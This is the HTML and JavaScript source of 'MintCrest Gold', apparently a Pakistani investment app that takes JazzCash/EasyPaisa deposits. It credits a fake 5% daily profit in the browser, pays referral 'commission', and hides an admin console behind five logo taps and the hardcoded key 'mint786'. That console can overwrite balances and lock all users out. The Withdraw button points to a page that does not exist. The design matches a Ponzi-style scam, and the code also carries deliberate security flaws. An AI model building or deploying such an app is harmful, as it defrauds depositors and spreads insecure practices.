<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>MintCrest Gold | Final Enterprise</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --blue: #2f81f7; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); border-radius: 16px; }
        .page { display: none; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        input { background: #161b22; border: 1px solid var(--border); color: white; padding: 14px; border-radius: 12px; width: 100%; outline: none; margin-bottom: 10px; font-size: 14px; }
        .btn-prime { background: linear-gradient(135deg, #2f81f7, #1e40af); color: white; font-weight: 800; border-radius: 12px; cursor: pointer; border: none; padding: 16px; width: 100%; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        #toast { visibility: hidden; min-width: 250px; background: #2f81f7; color: #fff; text-align: center; border-radius: 8px; padding: 16px; position: fixed; z-index: 20000; left: 50%; transform: translateX(-50%); bottom: 100px; font-size: 12px; font-weight: 800; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        #toast.show { visibility: visible; animation: fadeInOut 3s; }
        @keyframes fadeInOut { 0%, 100% { opacity: 0; bottom: 80px; } 15%, 85% { opacity: 1; bottom: 100px; } }
        .nav-icon { opacity: 0.4; transition: 0.3s; cursor: pointer; }
        .nav-icon.active { opacity: 1; color: #2f81f7; }
    </style>
</head>
<body onclick="handleSecretTaps()">

    <div id="toast">SYSTEM ONLINE</div>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[#010409] hidden flex flex-col items-center justify-center p-10 text-center">
        <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-8"></div>
        <h1 class="text-2xl font-black text-blue-500 mb-3 uppercase">Node Optimization</h1>
        <p class="text-[10px] font-bold opacity-40 uppercase">Upgrading server for maximum profit sweetie! 😘</p>
    </div>

    <header class="p-5 flex justify-between items-center bg-[#010409]/95 backdrop-blur-lg border-b border-white/5 sticky top-0 z-[5000]">
        <div class="flex items-center gap-4">
            <div onclick="adminTrigger()" class="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white font-black text-lg shadow-lg">M</div>
            <div>
                <h1 class="text-[13px] font-black uppercase">MINTCREST <span class="text-blue-500">GOLD</span></h1>
                <p id="user-display" class="text-[8px] font-bold opacity-50 uppercase text-blue-400">Syncing...</p>
            </div>
        </div>
        <div id="top-bal" class="bg-blue-600/10 px-4 py-2 rounded-xl border border-blue-500/20 text-blue-500 text-[11px] font-black italic">PKR 0.00</div>
    </header>

    <main id="app-body" class="p-6 space-y-7 pb-32">
        
        <div id="p-home" class="page active-page space-y-7">
            <div class="glass p-8 bg-gradient-to-br from-blue-900 via-[#0d1117] to-[#010409] border-blue-500/10 relative overflow-hidden">
                <p class="text-[10px] font-bold opacity-40 uppercase tracking-widest">Available Balance</p>
                <h2 class="text-5xl font-black tracking-tighter mt-2" id="main-bal">PKR 0</h2>
                <div class="mt-10 flex gap-4">
                    <button onclick="changePage('deposit')" class="flex-1 py-4 bg-blue-500 text-white rounded-2xl font-black text-[11px] uppercase active:scale-95">Add Funds</button>
                    <button onclick="changePage('withdraw')" class="flex-1 py-4 bg-white/5 border border-white/10 rounded-2xl font-black text-[11px] uppercase active:scale-95">Withdraw</button>
                </div>
            </div>
            <div id="plans-container" class="space-y-4"></div>
        </div>

        <div id="p-team" class="page space-y-7">
            <div class="glass p-7 text-center border-l-4 border-blue-500">
                <p class="text-[10px] font-bold opacity-40 uppercase mb-3">Your Referral Asset Link</p>
                <div class="flex items-center gap-3 bg-white/5 p-4 rounded-2xl border border-white/5">
                    <p id="ref-link" class="text-[11px] font-bold text-blue-500 break-all flex-1 text-left">---</p>
                    <button onclick="copyRef()" class="text-blue-500 text-xl"><i class="fa-solid fa-copy"></i></button>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-5">
                <div class="glass p-6 text-center"><h4 id="team-size" class="text-3xl font-black">0</h4><p class="text-[9px] opacity-40 uppercase font-bold mt-1">Nodes</p></div>
                <div class="glass p-6 text-center"><h4 id="team-bonus" class="text-3xl font-black text-green-500">PKR 0</h4><p class="text-[9px] opacity-40 uppercase font-bold mt-1">Commission</p></div>
            </div>
        </div>

        <div id="p-deposit" class="page space-y-7">
            <div id="gateways" class="space-y-3"></div>
            <div class="glass p-7 space-y-5">
                <input type="number" id="dep-amt" placeholder="Deposit Amount">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
                <input type="file" id="dep-file" class="text-[11px] border-2 border-dashed border-white/10 py-6 text-center">
                <button onclick="submitDeposit()" class="btn-prime">Submit for Verification</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-7 pb-40">
        <div class="flex justify-between items-center mb-8 border-b border-white/5 pb-4">
            <h2 class="text-xl font-black text-blue-500 uppercase">God Console</h2>
            <button onclick="closeAdmin()" class="bg-white/5 px-6 py-2 rounded-xl text-[10px] font-bold">CLOSE</button>
        </div>
        <button onclick="toggleMaintenance()" id="m-btn" class="w-full py-4 mb-6 rounded-2xl font-black text-[11px] uppercase">Toggle System Lock</button>
        <div id="admin-queue" class="space-y-5"></div>
        <div class="glass p-7 mt-10 border-l-4 border-purple-500">
            <h4 class="text-[11px] font-black uppercase mb-5">Manual Balance Override</h4>
            <input id="adm-user" placeholder="User Name">
            <input id="adm-val" type="number" placeholder="New Balance">
            <button onclick="forceUpdate()" class="w-full py-4 bg-purple-600 rounded-2xl font-black text-[11px] uppercase">Apply Balance</button>
        </div>
    </div>

    <nav class="fixed bottom-0 w-full glass bg-[#0d1117]/98 border-t border-white/5 p-7 flex justify-around items-center z-[5000] rounded-t-[35px]">
        <i onclick="changePage('home')" class="fa-solid fa-home text-2xl nav-icon active" id="nav-home"></i>
        <i onclick="changePage('team')" class="fa-solid fa-users text-2xl nav-icon" id="nav-team"></i>
        <i onclick="changePage('deposit')" class="fa-solid fa-plus-circle text-2xl nav-icon" id="nav-deposit"></i>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let tA = 0; let tB = 0; let mActive = false;

        // --- ADMIN LOGIC ---
        function adminTrigger() { tA++; if(tA >= 5) { if(prompt("Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); runAdminSync(); } tA=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function handleSecretTaps() { if(!document.getElementById('lock-screen').classList.contains('hidden')) { tB++; if(tB >= 5) { if(prompt("Bypass:")==="mint786") { document.getElementById('lock-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); runAdminSync(); } tB=0; } } }

        async function runAdminSync() {
            db.collection("requests").where("status","==","pending").onSnapshot(s => {
                const q = document.getElementById('admin-queue'); q.innerHTML = '';
                s.forEach(doc => {
                    const r = doc.data();
                    q.innerHTML += `<div class="glass p-5 border-l-4 border-blue-500 text-[11px] font-bold uppercase">
                        <p>${r.user} | PKR ${r.amount}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full rounded-xl my-3">` : ''}
                        <button onclick="approveDeposit('${doc.id}','${r.user}',${r.amount})" class="w-full py-3 bg-green-600 rounded-xl mt-2">APPROVE</button>
                    </div>`;
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                mActive = d.data()?.maintenance;
                document.getElementById('m-btn').innerText = "System Lock: " + (mActive?"ON":"OFF");
            });
        }

        async function approveDeposit(id, u, a) {
            await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(a), active: true });
            await db.collection("requests").doc(id).update({ status: 'approved' });
            showToast("APPROVED");
        }

        async function toggleMaintenance() { await db.collection("settings").doc("system").set({ maintenance: !mActive }); }
        async function forceUpdate() { const u = document.getElementById('adm-user').value; const v = Number(document.getElementById('adm-val').value); await db.collection("users").doc(u).update({ balance: v }); showToast("BALANCE SET"); }

        // --- AUTO PROFIT ---
        async function checkProfit(id, data) {
            const now = Date.now();
            const last = data.lastProfit || 0;
            if (data.active && (now - last) >= 86400000) {
                const gain = Math.floor(data.balance * 0.05);
                if (gain > 0) {
                    await db.collection("users").doc(id).update({ balance: firebase.firestore.FieldValue.increment(gain), lastProfit: now });
                    showToast(`+PKR ${gain} PROFIT ADDED!`);
                }
            }
        }

        // --- USER CORE ---
        function syncUser(id) {
            db.collection("users").doc(id).onSnapshot(async d => {
                user = d.data(); if(!user) return;
                await checkProfit(id, user);
                document.getElementById('main-bal').innerText = "PKR " + (user.balance || 0).toLocaleString();
                document.getElementById('top-bal').innerText = "PKR " + (user.balance || 0).toLocaleString();
                document.getElementById('ref-link').innerText = window.location.origin + "/?ref=" + id;
                db.collection("users").where("refBy","==",id).onSnapshot(s => {
                    document.getElementById('team-size').innerText = s.size;
                    let b = 0; s.forEach(doc => b += (doc.data().balance * 0.1));
                    document.getElementById('team-bonus').innerText = "PKR " + b.toLocaleString();
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                if(d.data()?.maintenance && id !== 'admin') document.getElementById('lock-screen').classList.remove('hidden');
                else document.getElementById('lock-screen').classList.add('hidden');
            });
            db.collection("settings").doc("gateways").onSnapshot(d => {
                const g = d.data();
                document.getElementById('gateways').innerHTML = `
                    <div class="p-4 glass flex justify-between font-black border-l-4 border-yellow-500"><span>JazzCash</span><span>${g.jazz}</span></div>
                    <div class="p-4 glass flex justify-between font-black border-l-4 border-green-500"><span>EasyPaisa</span><span>${g.easy}</span></div>`;
            });
            db.collection("plans").orderBy("price","asc").onSnapshot(s => {
                const c = document.getElementById('plans-container'); c.innerHTML = '';
                s.forEach(doc => {
                    const p = doc.data();
                    c.innerHTML += `<div class="glass p-6 border-l-4 border-blue-500 flex justify-between items-center">
                        <div><p class="text-[9px] opacity-30 uppercase">${p.name}</p><h4 class="text-xl font-black">PKR ${p.price}</h4><p class="text-[10px] text-green-500 font-bold mt-1">${p.dailyProfit}/Day</p></div>
                        <button onclick="changePage('deposit')" class="bg-blue-600 px-6 py-3 rounded-xl font-black text-[10px]">ACTIVATE</button>
                    </div>`;
                });
            });
        }

        async function submitDeposit() {
            const a = Number(document.getElementById('dep-amt').value); const t = document.getElementById('dep-tid').value; const img = document.getElementById('dep-file').files[0];
            if(!a || !t || !img) return alert("All data required!");
            const r = new FileReader(); r.readAsDataURL(img);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: r.result, type: 'Deposit', status: 'pending', time: Date.now() });
                showToast("REQUEST SENT!"); changePage('home');
            };
        }

        function showToast(m) { const t = document.getElementById("toast"); t.innerText = m; t.className = "show"; setTimeout(()=>t.className="", 3000); }
        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('.nav-icon').forEach(i=>i.classList.remove('active')); document.getElementById('nav-'+p).classList.add('active');
        }
        function copyRef() { navigator.clipboard.writeText(document.getElementById('ref-link').innerText); showToast("LINK COPIED!"); }
        
        window.onload = () => { 
            const session = localStorage.getItem('mc_session');
            if(session) {
                document.getElementById('user-display').innerText = "ID: " + session.toUpperCase();
                syncUser(session);
            }
        }
    </script>
</body>
</html>
